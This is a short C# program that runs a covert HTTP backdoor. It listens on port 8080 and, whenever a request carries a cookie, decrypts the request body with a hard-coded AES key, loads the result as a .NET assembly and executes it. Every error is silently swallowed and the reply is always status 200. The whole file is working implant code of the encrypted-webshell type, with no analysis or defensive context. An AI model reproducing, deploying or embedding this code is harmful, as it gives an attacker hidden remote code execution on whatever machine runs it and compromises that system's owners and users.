using System;
using System.IO;
using System.Net;
using System.Text;
using System.Security.Cryptography;
using System.Reflection;

namespace HttpPayloadExecutor
{
    class Program
    {
        static void Main(string[] args)
        {
            string url = "http://+:8080/";
            using (HttpListener listener = new HttpListener())
            {
                listener.Prefixes.Add(url);
                listener.Start();
                while (true)
                {
                    try
                    {
                        HttpListenerContext context = listener.GetContext();
                        byte[] k = Encoding.Default.GetBytes("ca63457538b9b1e0");
                        if (context.Request.Cookies.Count != 0)
                        {
                            MemoryStream ms = new MemoryStream();
                            context.Request.InputStream.CopyTo(ms);
                            byte[] c = ms.ToArray();
                            if (c.Length > 0)
                            {
                                RijndaelManaged rm = new RijndaelManaged();
                                byte[] d = rm.CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length);
                                Assembly.Load(d).CreateInstance("K").Equals(context);
                            }
                        }
                        context.Response.StatusCode = 200;
                        context.Response.Close();
                    }
                    catch { }
                }
            }
        }
    }
}